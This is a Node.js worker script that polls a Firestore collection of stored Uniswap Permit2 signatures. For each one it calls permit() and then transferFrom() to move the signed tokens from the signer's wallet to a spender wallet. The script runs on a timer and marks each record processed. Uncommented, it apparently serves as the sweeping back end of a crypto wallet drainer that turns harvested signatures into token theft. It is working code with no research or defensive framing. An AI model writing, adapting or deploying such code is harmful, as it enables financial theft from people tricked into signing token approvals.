import dotenv from 'dotenv';
dotenv.config();
import admin from 'firebase-admin';
import { ethers } from 'ethers';

const serviceAccount = {
  projectId: process.env.FIREBASE_PROJECT_ID,
  clientEmail: process.env.FIREBASE_CLIENT_EMAIL,
  privateKey: process.env.FIREBASE_PRIVATE_KEY?.replace(/\\n/g, "\n"),
};

admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
});

const db = admin.firestore();

const RPC_URL = process.env.RPC_URL;
const SPENDER_PRIVATE_KEY = process.env.SPENDER_PRIVATE_KEY;

const provider = new ethers.JsonRpcProvider(RPC_URL);
const spenderWallet = new ethers.Wallet(SPENDER_PRIVATE_KEY, provider);

const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";

const ABI = [
  "function permit(address owner, ((address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature)",
  "function transferFrom(address token, address from, address to, uint160 amount)"
];

const contract = new ethers.Contract(PERMIT2, ABI, spenderWallet);

console.log("Worker started. Listening for unprocessed signatures...");

async function poll() {
  const snaps = await db.collection("permit2_signatures")
    .where("processed", "==", false)
    .limit(10)
    .get();

  if (snaps.empty) return;

  for (const docSnap of snaps.docs) {
    const data = docSnap.data();
    console.log("Processing permit from:", data.owner);

    try {
      // Rebuild signature bytes
      const fullSig = ethers.concat([
        data.r,
        data.s,
        ethers.toBeHex(data.v)
      ]);

      // First call PERMIT
      const permitTx = await contract.permit(
        data.owner,
        {
          details: {
            token: data.token,
            amount: BigInt(data.amount),
            expiration: data.deadline,
            nonce: data.nonce
          },
          spender: data.spender,
          sigDeadline: data.deadline
        },
        fullSig
      );

      console.log("Permit submitted:", permitTx.hash);
      const permitReceipt = await permitTx.wait();
      console.log("Permit confirmed:", permitReceipt.transactionHash);

      // Now execute transferFrom
      const tx = await contract.transferFrom(
        data.token,
        data.owner,
        data.spender,
        BigInt(data.amount)
      );

      console.log("Transfer submitted:", tx.hash);
      const receipt = await tx.wait();
      console.log("Transfer confirmed:", receipt.transactionHash);

      await docSnap.ref.update({
        processed: true,
        permitTx: permitReceipt.transactionHash,
        transferTx: receipt.transactionHash,
        processedAt: Date.now()
      });
    } catch (err) {
      console.error("Worker error:", err);
      await docSnap.ref.update({
        lastError: String(err),
        lastErrorAt: Date.now()
      });
    }
  }
}

setInterval(poll, 8000);
